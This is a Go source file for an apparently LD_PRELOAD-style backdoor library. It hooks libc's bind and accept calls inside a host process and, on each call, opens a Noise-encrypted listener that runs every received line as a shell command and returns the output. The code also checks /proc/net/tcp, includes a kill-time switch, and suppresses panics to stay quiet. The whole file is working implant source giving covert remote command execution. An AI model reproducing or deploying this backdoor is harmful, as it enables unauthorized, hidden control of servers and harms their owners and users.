package main

import "C"
import (
	"bufio"
	"encoding/base64"
	"encoding/hex"
	"github.com/flynn/noise"
	"github.com/rainycape/dl"
	"gopkg.in/noisesocket.v0"
	"io"
	"log"
	"net"
	"net/textproto"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var Debug = "false"
var BindString = "127.0.0.1:4444"
var bdPriv string
var bdPub string
var cliPub string
var cliKey string
var killTime string
var serverKeys noise.DHKey

func PortAvail() bool {
	//This is very silly, the format ignores ipv6 and parsing all the structures may be better than parsing line by line.
	f, err := os.Open("/proc/net/tcp")
	if err != nil && Debug == "true" {
		log.Println("BDERROR: Cannot open /proc/net/tcp - " + err.Error())
		return false
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	scanner.Scan() //Skip first line
	for scanner.Scan() {
		s := strings.Split(scanner.Text(), ":")
		src := s[1][1:9]
		dst := make([]byte, hex.DecodedLen(len(src)))
		_, err := hex.Decode(dst, []byte(src))
		if err != nil && Debug == "true" {
			log.Println("BDERROR: Parse - " + err.Error())
		}
		lport, _ := strconv.ParseUint(s[2][:4], 16, 32)
		laddr := net.IPv4(dst[3], dst[2], dst[1], dst[0]).String()
		listen := laddr + ":" + strconv.Itoa(int(lport))
		if listen == BindString && Debug == "true" {
			log.Printf("BD: ALREADY LISTENING: %s\n", listen)
			return false
		}
		if laddr == "0.0.0.0" && strconv.Itoa(int(lport)) == strings.Split(BindString, ":")[1] && Debug == "true" {
			log.Printf("BD: ALREADY LISTENING ALL ADDRS: %s\n", listen)
			return false
		}
	}
	if err = scanner.Err(); err != nil && Debug == "true" {
		log.Println("BDERROR: Cannot parse /proc/net/tcp - " + err.Error())
	}
	return true
}

func init() {
	p1, err := base64.StdEncoding.DecodeString(bdPub)
	if err != nil && Debug == "true" {
		log.Println("BDINITERR: " + err.Error())
	}
	pr1, err := base64.StdEncoding.DecodeString(bdPriv)
	if err != nil && Debug == "true" {
		log.Println("BDINITERR: " + err.Error())
	}
	c1, err := base64.StdEncoding.DecodeString(cliPub)
	if err != nil && Debug == "true" {
		log.Println("BDINITERR: " + err.Error())
	}
	serverKeys = noise.DHKey{
		Public:  []byte(p1),
		Private: []byte(pr1),
	}
	engagementTime, err := strconv.Atoi(killTime)

	if engagementTime > 0 {
		if time.Now().Unix() > int64(engagementTime) {
			log.Println("===TIMES UP===")
		}
		//TODO setup syslog and delete self
	}
	cliKey = string(c1)
	defer func() {
		if r := recover(); r != nil {
			if Debug == "true" {
				log.Printf("BDPANIC: %v\n", r)
			}
		}
	}()
	if Debug == "true" {
		log.Println("BD: Initialized")
	}
	defer func() {
		if r := recover(); r != nil {
			//Silence the panics if possible
		}
	}()
}

func main() {}

//export bind
func bind(s C.int, a unsafe.Pointer, st C.size_t) *C.int {

	var ut syscall.Sysinfo_t
	syscall.Sysinfo(&ut)
	t := (*syscall.RawSockaddr)(a)
	lib, err := dl.Open("libc", 0)
	if err != nil && Debug == "true" {
		log.Fatalln(err)
	}
	defer lib.Close()

	var old_bind func(s C.int, a *syscall.RawSockaddr, st C.size_t) *C.int
	lib.Sym("bind", &old_bind)
	if Debug == "true" {
		log.Println("BD: Hooked bind")
	}
	go backdoor()
	return old_bind(s, t, st)
}

//export accept
func accept(s C.int, a unsafe.Pointer, st C.size_t) *C.int {
	t := (*syscall.RawSockaddr)(a)
	go backdoor()
	lib, err := dl.Open("libc", 0)
	if err != nil && Debug == "true" {
		log.Fatalln(err)
	}
	defer lib.Close()

	var old_accept func(s C.int, a *syscall.RawSockaddr, st C.size_t) *C.int
	lib.Sym("accept", &old_accept)
	if Debug == "true" {
		log.Println("BD: Hooked accept")
	}
	oa := old_accept(s, t, st)
	//TODO the sockaddr_in struct assignment seems to not be able to handle fmt instantly, putting it into a new thread either fights the race condition or the assignment itself is async? This could be a cgo/go bug.
	//go func() {
	//in := (*syscall.RawSockaddrInet4)(a)
	//log.Println("!> %#v\n", in.Port)
	//log.Println("!> %#v\n", t)
	//}()
	return oa
}

func backdoor() {
	if !PortAvail() {
		return
	}
	ln, err := noisesocket.Listen(BindString, &noisesocket.ConnectionConfig{
		StaticKey:  serverKeys,
		PeerStatic: []byte(cliKey),
	})
	if err != nil {
		return
	}
	if Debug == "true" {
		log.Println("BD: Backdoor listening")
	}
	for {
		conn, err := ln.Accept()
		if err != nil && Debug == "true" {
			log.Printf("BDERROR-ACCEPT: %#v\n", err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	reader := bufio.NewReader(conn)
	tp := textproto.NewReader(reader)
	for {
		input, err := tp.ReadLine()
		if err != nil && err != io.EOF && Debug == "true" {
			log.Println("Error reading:", err.Error())
			break
		}
		cmd := exec.Command("/usr/bin/env", "sh", "-c", input)
		output, err := cmd.CombinedOutput()
		if err != nil {
			conn.Write([]byte(err.Error() + "\n"))
		}
		conn.Write(output)
	}
	conn.Close()
}
